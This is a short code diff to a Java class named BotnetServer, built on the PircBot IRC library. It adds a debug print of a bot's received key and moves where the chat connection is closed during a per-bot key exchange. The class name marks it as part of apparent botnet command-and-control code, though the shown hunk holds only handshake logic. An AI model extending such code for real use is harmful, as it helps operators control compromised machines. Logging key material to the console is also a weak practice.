@@ -170,10 +170,11 @@ public class BotnetServer extends PircBot {
 						chat.sendLine(m.getStrKey()); // send key
 						chat.sendLine(info.toString()); // send public info
 						String otherKey = chat.readLine(); // get public key
+						System.out.println("key: " + otherKey);
 						m.handShake(otherKey);
 						botKeys.put(bots[i].getNick(), m);
+						chat.close();
 					}
-					chat.close();
 				} catch (Exception e) {
 					System.out.println("\tThere was an issue performing the key exchange");
 					e.printStackTrace();
